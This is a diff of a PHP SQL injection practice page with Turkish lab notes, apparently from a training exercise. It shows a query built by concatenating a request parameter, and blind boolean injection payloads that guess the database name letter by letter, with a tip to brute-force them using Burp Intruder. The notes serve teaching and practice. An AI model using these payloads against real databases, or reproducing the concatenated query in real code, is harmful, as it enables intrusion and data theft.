@@ -48,7 +48,7 @@ function checkInput($data)
     if(isset($_REQUEST["name"])){
         $name = $_REQUEST["name"];
         $sql = "SELECT * FROM aburcubur WHERE aa_name='".checkInput($name)."'";
-        echo $sql."<br>";
+        #echo $sql."<br>";
         $result = $newconn->conn->query($sql);
         if(!$result)
             die("<font color=\"red\">Incorrect syntax detected!</font>");
@@ -73,8 +73,8 @@ function checkInput($data)
 
 Level 0:
 
-' or (substring(database(),1,1))='t'# -database in ilk harfinin t olup olmadığını sorduk
-' or (substring(database(),2,1))='e'# -database in ilinci harfinin e olup olmadığını sorduk
+' or (substring(database(),1,1))='j'# -database in ilk harfinin t olup olmadığını sorduk
+' or (substring(database(),2,1))='o'# -database in ilinci harfinin e olup olmadığını sorduk
 
 kendi kodunla yada burbsuit in intruder ile bruteforce tek tek denersin. database ismini öğrendik
 
